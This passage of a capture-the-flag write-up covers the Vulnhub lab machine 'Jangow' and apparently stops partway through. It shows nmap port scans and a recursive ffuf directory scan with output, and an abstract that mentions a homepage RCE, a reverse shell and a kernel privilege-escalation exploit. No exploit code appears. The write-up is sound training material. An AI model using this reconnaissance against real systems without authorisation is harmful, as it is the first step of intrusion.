  <a href="#possible-rabbit-holes-or-different-attack-vectors" class="md-nav__link">
    Possible rabbit holes or different attack vectors
  </a>
  
    <nav class="md-nav" aria-label="Possible rabbit holes or different attack vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dirtycow" class="md-nav__link">
    DirtyCOW
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-wordpress-folder" class="md-nav__link">
    The wordpress folder
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-ftp-credentials" class="md-nav__link">
    The ftp credentials
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-backup-file-in-the-script-folder" class="md-nav__link">
    The backup file in the /script folder
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    THM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            THM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_1" >
        
          <label class="md-nav__link" for="__nav_4_3_1" id="__nav_4_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Easy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3_1">
            <span class="md-nav__icon md-icon"></span>
            Easy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../thm/easy/easypeasy/easypeasy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    EasyPeasy
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tools
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Tools
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../tools/tmux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    tmux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../tools/ffuf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ffuf
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../cheatsheets/cheatsheet_basic_linux_tools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Linux Tools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../cheatsheets/cheatsheet_basic_pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Pentesting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../cheatsheets/cheatsheet_curl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    curl
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../cheatsheets/cheatsheet_nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nmap
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#abstract" class="md-nav__link">
    Abstract
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-footprinting" class="md-nav__link">
    Web Footprinting
  </a>
  
    <nav class="md-nav" aria-label="Web Footprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory" class="md-nav__link">
    Directory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#website" class="md-nav__link">
    Website
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation-research" class="md-nav__link">
    Exploitation Research
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#possible-rabbit-holes-or-different-attack-vectors" class="md-nav__link">
    Possible rabbit holes or different attack vectors
  </a>
  
    <nav class="md-nav" aria-label="Possible rabbit holes or different attack vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dirtycow" class="md-nav__link">
    DirtyCOW
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-wordpress-folder" class="md-nav__link">
    The wordpress folder
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-ftp-credentials" class="md-nav__link">
    The ftp credentials
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#the-backup-file-in-the-script-folder" class="md-nav__link">
    The backup file in the /script folder
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                 
                  


  <h1>Jangow</h1>

<h2 id="abstract">Abstract</h2>
<p><a href="https://www.vulnhub.com/entry/jangow-101,754/">jangow001</a> is a vulnerable box from <a href="https://www.vulnhub.com/">vulnhub</a>. It's categorized as an easy machine. During initial enumeration we walk the website and pretty soon we discover a RCE in the homepage. We try to use some well know reverse shells but we hit a roadblock because of filtered outgoing connections. After we solve that problem we get an initial foothold and using linpeas it's pretty straightforward. We find the exploit, compile it and finally run it and get the root shell. </p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">initial</label><label for="__tabbed_1_2">extended</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.0.28<span class="w"> </span>-oA<span class="w"> </span>nmap/inital_scan<span class="w"> </span>
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.91<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-11-16<span class="w"> </span><span class="m">22</span>:32<span class="w"> </span>CET
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.0.28
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00038s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>filtered<span class="w"> </span>ports
<span class="hll">PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
</span><span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp<span class="w">     </span>vsftpd<span class="w"> </span><span class="m">3</span>.0.3
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.18
<span class="p">|</span><span class="w"> </span>http-ls:<span class="w"> </span>Volume<span class="w"> </span>/
<span class="p">|</span><span class="w"> </span>SIZE<span class="w">  </span>TIME<span class="w">              </span>FILENAME
<span class="hll"><span class="p">|</span><span class="w"> </span>-<span class="w">     </span><span class="m">2021</span>-06-10<span class="w"> </span><span class="m">18</span>:05<span class="w">  </span>site/
</span><span class="p">|</span>_
<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title:<span class="w"> </span>Index<span class="w"> </span>of<span class="w"> </span>/
MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:87:2C:C8<span class="w"> </span><span class="o">(</span>Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span><span class="m">127</span>.0.0.1<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Unix

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">14</span>.80<span class="w"> </span>seconds
</code></pre></div></td></tr></table></div>
</div>
<div class="tabbed-block">
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.0.28<span class="w"> </span>-oA<span class="w"> </span>nmap/extended_scan<span class="w">  </span>
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.91<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-11-16<span class="w"> </span><span class="m">22</span>:41<span class="w"> </span>CET
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.0.28
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00021s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65533</span><span class="w"> </span>filtered<span class="w"> </span>ports
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE
<span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http
MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:87:2C:C8<span class="w"> </span><span class="o">(</span>Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">104</span>.52<span class="w"> </span>seconds
</code></pre></div></td></tr></table></div>
</div>
</div>
</div>
<h2 id="web-footprinting">Web Footprinting</h2>
<h3 id="directory">Directory</h3>
<p>Looking at the IP we see a folder <code>site</code>. Going into that folder we see a homepage.</p>
<p>We are starting a recursive ffuf scan, 5 levels deep, to see if something is inside this folder.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://192.168.0.28/site/FUZZ<span class="w"> </span>-w<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<span class="w"> </span>-e<span class="w"> </span>.php<span class="w"> </span>-recursion<span class="w"> </span>-recursion-depth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-c<span class="w"> </span>-fc<span class="w"> </span><span class="m">403</span><span class="w"> </span>-v<span class="w"> </span>-o<span class="w">  </span>enumeration/ffuf<span class="w">                                                                                                             </span><span class="m">1</span><span class="w"> </span>⨯

<span class="w">        </span>/<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">&#39;</span>___<span class="se">\ </span><span class="w">      </span>
<span class="w">       </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/<span class="w">       </span>
<span class="w">       </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span><span class="w">     </span>
<span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/<span class="w">      </span>
<span class="w">         </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\ </span><span class="w">      </span>
<span class="w">          </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/<span class="w">       </span>

<span class="w">       </span>v1.3.1<span class="w"> </span>Kali<span class="w"> </span>Exclusive<span class="w"> </span>&lt;<span class="m">3</span>
________________________________________________

<span class="w"> </span>::<span class="w"> </span>Method<span class="w">           </span>:<span class="w"> </span>GET
<span class="w"> </span>::<span class="w"> </span>URL<span class="w">              </span>:<span class="w"> </span>http://192.168.0.28/site/FUZZ
<span class="w"> </span>::<span class="w"> </span>Wordlist<span class="w">         </span>:<span class="w"> </span>FUZZ:<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
<span class="w"> </span>::<span class="w"> </span>Extensions<span class="w">       </span>:<span class="w"> </span>.php<span class="w"> </span>
<span class="w"> </span>::<span class="w"> </span>Output<span class="w"> </span>file<span class="w">      </span>:<span class="w"> </span>enumeration/ffuf
<span class="w"> </span>::<span class="w"> </span>File<span class="w"> </span>format<span class="w">      </span>:<span class="w"> </span>json
<span class="w"> </span>::<span class="w"> </span>Follow<span class="w"> </span>redirects<span class="w"> </span>:<span class="w"> </span><span class="nb">false</span>
<span class="w"> </span>::<span class="w"> </span>Calibration<span class="w">      </span>:<span class="w"> </span><span class="nb">false</span>
<span class="w"> </span>::<span class="w"> </span>Timeout<span class="w">          </span>:<span class="w"> </span><span class="m">10</span>
<span class="w"> </span>::<span class="w"> </span>Threads<span class="w">          </span>:<span class="w"> </span><span class="m">40</span>
<span class="w"> </span>::<span class="w"> </span>Matcher<span class="w">          </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>,204,301,302,307,401,403,405
<span class="w"> </span>::<span class="w"> </span>Filter<span class="w">           </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">403</span>
________________________________________________

<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">318</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets
<span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>assets

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://192.168.0.28/site/assets/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">321</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/wordpress
<span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/wordpress/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>wordpress

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://192.168.0.28/site/wordpress/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">315</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/css
<span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/css/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>css

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://192.168.0.28/site/css/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">314</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/js
<span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/js/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>js

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://192.168.0.28/site/js/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">10190</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">3711</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">174</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                          </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://192.168.0.28/site/assets/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">322</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets/img
<span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets/img/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>img

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://192.168.0.28/site/assets/img/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">1146</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">74</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">18</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                              </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://192.168.0.28/site/wordpress/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">87</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">10</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                                 </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/wordpress/config.php
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>config.php

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">10190</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">3711</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">174</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                          </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/wordpress/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://192.168.0.28/site/css/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">948</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">61</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">17</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/css/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

